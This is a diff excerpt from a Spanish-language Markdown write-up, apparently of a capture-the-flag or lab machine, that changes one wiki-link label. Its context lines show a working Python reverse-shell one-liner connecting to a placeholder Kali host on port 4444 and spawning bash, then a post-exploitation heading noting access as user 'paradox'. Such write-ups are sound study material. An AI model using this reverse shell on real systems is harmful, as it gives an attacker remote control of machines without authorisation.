@@ -109,7 +109,7 @@ He estado probando a introducir código ***Python***, ***PHP*** (el cual parece 
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP_KALI",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
 ```
 
->Explicación de porqué este script si funciona: ***[[#`python3 -c '...`|Explicación]]***
+>Explicación de porqué este script si funciona: ***[[#`python3 -c '...`]]***
 # <font color=red>[+]</font> Post-Explotación
 
 Obtenemos acceso al sistema como el usuario `paradox`:
